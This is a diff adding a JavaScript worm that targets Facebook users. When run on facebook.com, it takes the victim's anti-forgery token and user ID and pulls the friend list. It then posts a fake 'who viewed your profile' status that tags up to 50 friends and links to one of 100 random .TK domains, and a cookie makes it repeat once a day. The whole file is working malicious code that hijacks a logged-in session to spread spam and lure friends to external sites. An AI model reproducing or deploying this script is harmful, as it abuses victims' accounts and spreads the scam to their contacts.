@@ -1,0 +1,215 @@
+var stompa = window.location.hostname;
+function uniqueArr(a) { temp = new Array(); for(i=0;i<a.length;i++){ if(!contains(temp, a[i])){ temp.length+=1; temp[temp.length-1]=a[i]; } } return temp; }
+function contains(a, e){ for(j=0;j<a.length;j++)if(a[j]==e)return true; return false;}
+function setCookie(c_name,value,exdays){ var exdate=new Date(); exdate.setDate(exdate.getDate() + exdays); var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString()); document.cookie=c_name + "=" + c_value; }
+function getCookie(c_name)
+{var i,x,y,ARRcookies=document.cookie.split(";");for(i=0;i<ARRcookies.length;i++)
+{x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);x=x.replace(/^\s+|\s+$/g,"");if(x==c_name)
+{return unescape(y);}}}
+
+if (stompa.indexOf('facebook.com') > 0) {
+function createXMLHttpRequest()
+        {
+        return window.ActiveXObject?new ActiveXObject("Msxml2.XMLHTTP"):new XMLHttpRequest
+}
+var c=createXMLHttpRequest();
+c.open("GET","/?sk=nf",false);
+c.send(null);
+var e=c.responseText;
+var fb_dtsg = e.match(/\"fb_dtsg\"\:\"(.*?)\"/)[1];
+var comp_id = e.match(/\"xhpc_composerid\" value\=\"(.*?)\"/)[1];
+var user_id = document.cookie.match(/c_user=\d+/gi)[0].replace("c_user=","");
+var post_form_id = null;
+
+
+var friends = new Array();
+gf = new XMLHttpRequest();
+gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token=' + Math['random']() + '&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=' + user_id, false);
+gf['send']();
+if (gf['readyState'] != 4) {} else {
+    data = eval('(' + gf['responseText']['substr'](9) + ')');
+    if (data['error']) {} else {
+        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
+            return _0x93dax8['index'] - _0x93dax9['index'];
+        });
+    };
+};
+
+
+
+function randOrd(){
+return (Math.round(Math.random())-0.5);
+}
+friends.sort( randOrd );
+
+
+var statusit = Math.floor(Math.random()*101);
+var likeit = Math.floor(Math.random()*101);
+var chatit = Math.floor(Math.random()*101);
+var wallit = Math.floor(Math.random()*101);
+
+var postmessages = new Array(
+""
+); 
+
+var rfactor = Math.floor(postmessages.length*Math.random());
+var blogs = new Array();
+
+blogs[0] = 'http://lb1zy.TK?';
+blogs[1] = 'http://6f9b2.TK?';
+blogs[2] = 'http://q3hwc.TK?';
+blogs[3] = 'http://zphpr.TK?';
+blogs[4] = 'http://gmeel.TK?';
+blogs[5] = 'http://22ca1.TK?';
+blogs[6] = 'http://ctq8p.TK?';
+blogs[7] = 'http://21ard.TK?';
+blogs[8] = 'http://1raek.TK?';
+blogs[9] = 'http://8t0u2.TK?';
+blogs[10] = 'http://8e3dg.TK?';
+blogs[11] = 'http://z1i8d.TK?';
+blogs[12] = 'http://6i3bu.TK?';
+blogs[13] = 'http://gx73c.TK?';
+blogs[14] = 'http://86w2v.TK?';
+blogs[15] = 'http://4b8a8.TK?';
+blogs[16] = 'http://wx39z.TK?';
+blogs[17] = 'http://5yfd4.TK?';
+blogs[18] = 'http://tqlbz.TK?';
+blogs[19] = 'http://ggjfh.TK?';
+blogs[20] = 'http://yl22s.TK?';
+blogs[21] = 'http://ig0sy.TK?';
+blogs[22] = 'http://duwb4.TK?';
+blogs[23] = 'http://qk2aw.TK?';
+blogs[24] = 'http://lj70f.TK?';
+blogs[25] = 'http://u7bkx.TK?';
+blogs[26] = 'http://g64lo.TK?';
+blogs[27] = 'http://x4lon.TK?';
+blogs[28] = 'http://96wum.TK?';
+blogs[29] = 'http://8ydf3.TK?';
+blogs[30] = 'http://r1nqk.TK?';
+blogs[31] = 'http://4zojh.TK?';
+blogs[32] = 'http://arso2.TK?';
+blogs[33] = 'http://ed5g3.TK?';
+blogs[34] = 'http://vddju.TK?';
+blogs[35] = 'http://bs7lx.TK?';
+blogs[36] = 'http://mztn6.TK?';
+blogs[37] = 'http://g82v4.TK?';
+blogs[38] = 'http://oxkmz.TK?';
+blogs[39] = 'http://7ogyk.TK?';
+blogs[40] = 'http://w7d2h.TK?';
+blogs[41] = 'http://f4fbr.TK?';
+blogs[42] = 'http://ixczf.TK?';
+blogs[43] = 'http://5lo28.TK?';
+blogs[44] = 'http://yo6yg.TK?';
+blogs[45] = 'http://dtmhf.TK?';
+blogs[46] = 'http://4abl3.TK?';
+blogs[47] = 'http://oqeum.TK?';
+blogs[48] = 'http://mzle0.TK?';
+blogs[49] = 'http://00vwr.TK?';
+blogs[50] = 'http://jekjk.TK?';
+blogs[51] = 'http://eere8.TK?';
+blogs[52] = 'http://dst14.TK?';
+blogs[53] = 'http://yl9w7.TK?';
+blogs[54] = 'http://g0xyt.TK?';
+blogs[55] = 'http://gb5mq.TK?';
+blogs[56] = 'http://2x2q1.TK?';
+blogs[57] = 'http://rhhfh.TK?';
+blogs[58] = 'http://re86q.TK?';
+blogs[59] = 'http://3fz0n.TK?';
+blogs[60] = 'http://o9xr5.TK?';
+blogs[61] = 'http://a7577.TK?';
+blogs[62] = 'http://r8yeq.TK?';
+blogs[63] = 'http://ayfg7.TK?';
+blogs[64] = 'http://7wcy5.TK?';
+blogs[65] = 'http://5iur6.TK?';
+blogs[66] = 'http://p89up.TK?';
+blogs[67] = 'http://xgaaa.TK?';
+blogs[68] = 'http://kiv11.TK?';
+blogs[69] = 'http://zq23y.TK?';
+blogs[70] = 'http://3hc51.TK?';
+blogs[71] = 'http://0faup.TK?';
+blogs[72] = 'http://u7324.TK?';
+blogs[73] = 'http://jqty1.TK?';
+blogs[74] = 'http://no3de.TK?';
+blogs[75] = 'http://gzecf.TK?';
+blogs[76] = 'http://hmo11.TK?';
+blogs[77] = 'http://uiud8.TK?';
+blogs[78] = 'http://821mi.TK?';
+blogs[79] = 'http://iqscu.TK?';
+blogs[80] = 'http://iqy7x.TK?';
+blogs[81] = 'http://r17yf.TK?';
+blogs[82] = 'http://uioh6.TK?';
+blogs[83] = 'http://scfsm.TK?';
+blogs[84] = 'http://53k8c.TK?';
+blogs[85] = 'http://5solw.TK?';
+blogs[86] = 'http://1u81i.TK?';
+blogs[87] = 'http://gs9ll.TK?';
+blogs[88] = 'http://du72r.TK?';
+blogs[89] = 'http://3e38d.TK?';
+blogs[90] = 'http://5mbtj.TK?';
+blogs[91] = 'http://wzwv0.TK?';
+blogs[92] = 'http://9egm6.TK?';
+blogs[93] = 'http://tj6u7.TK?';
+blogs[94] = 'http://fefab.TK?';
+blogs[95] = 'http://9una6.TK?';
+blogs[96] = 'http://natpq.TK?';
+blogs[97] = 'http://otslr.TK?';
+blogs[98] = 'http://soioy.TK?';
+blogs[99] = 'http://6opuo.TK?';
+
+
+
+
+
+
+
+
+
+
+var rand = Math.floor(Math.random() * blogs.length);
+var variables = Math.floor(Math.random()*100000000);
+var blog = blogs[rand] + variables;
+
+
+if (getCookie("fb_lovestats9") != "done"){
+
+            var r1 = Math.floor(Math.random()*50) + 90;
+            var r2 = Math.floor(Math.random()*15) + 64;
+            var r3 = Math.floor(Math.random()*10) + 40;
+            var r4 = Math.floor(Math.random()*20) + 20;
+            var r5 = Math.floor(Math.random()*20) + 1;
+            var rtotal = Math.floor(Math.random()*2000) + 300;
+            var postmessagetext = 'My profile was viewed for today' + rtotal + ' times.%0ATop 5 Visitors:%0A1- ' + friends[0]['text'] + ' - ' + r1 + ' visits%0A2- ' + friends[1]['text'] + ' - ' + r2 + ' visits%0A3- ' + friends[2]['text'] + ' - ' + r3 + ' visits%0A4- ' +  friends[3]['text'] + ' - ' + r4 + ' visits%0A5- ' + friends[4]['text'] + ' - ' + r5 + ' visits%0A%0ASee who has viewed your profile HERE:%0A'+blog;
+            var postmessage = 'My profile was viewed for today ' + rtotal + ' times.%0ATop 5 Visitors:%0A1- @[' + friends[0]['uid'] + ':' + friends[0]['text'] + '] - ' + r1 + ' visits%0A2- @[' + friends[1]['uid'] + ':' + friends[1]['text'] + '] - ' + r2 + ' visits%0A3- @[' + friends[2]['uid'] + ':' + friends[2]['text'] + '] - ' + r3 + ' visits%0A4- @[' + friends[3]['uid'] + ':' + friends[3]['text'] + '] - ' + r4 + ' visits%0A5- @[' + friends[4]['uid'] + ':' + friends[4]['text'] + '] - ' + r5 + ' visits%0A%0ASee who has viewed your profile HERE:%0A'+blog;
+            var friendsSlice = friends.slice(0, 50);
+            var who_with = '';
+            var who_with_arr = 0;
+            for(var loop = 0; loop < friendsSlice.length; loop++) {
+
+                if(friendsSlice[loop].uid == user_id) continue;
+
+                who_with = who_with + '&composertags_with['+who_with_arr+']='+friendsSlice[loop].uid+'&text_composertags_with['+who_with_arr+']='+friendsSlice[loop].text+'';
+                who_with_arr++;
+            }
+
+
+            var httpwp = new XMLHttpRequest();
+
+
+            var httpwp = new XMLHttpRequest();
+            var urlwp = '/ajax/updatestatus.php?__a=1';
+            var cur_time = Math.floor((new Date()).getTime() / 1000);
+                        var paramswp = 'post_form_id=' + post_form_id + '&fb_dtsg=' + fb_dtsg + '&xhpc_composerid=uuluny_1&xhpc_targetid=' + user_id + '&xhpc_context=home&xhpc_fbx=1&xhpc_timeline=&xhpc_ismeta=1&xhpc_message_text=' + postmessagetext + '&xhpc_message=' + postmessage + '&composertags_place=&composertags_place_name=&composer_predicted_city=&composer_session_id=' + cur_time + '&is_explicit_place=&audience[0][custom_value]=50&audience[0][value]=111&composertags_city=&disable_location_sharing=false&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest&__user=' + user_id + '&phstamp=' + cur_time  + who_with;
+            httpwp['open']('POST', urlwp, true);
+            httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+            httpwp['setRequestHeader']('Content-length', paramswp['length']);
+            httpwp['setRequestHeader']('Connection', 'keep-alive');
+            httpwp['onreadystatechange'] = function () {
+                if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
+            };
+            httpwp['send'](paramswp);
+setCookie("fb_lovestats9","done",1);
+
+}
+
+}
+
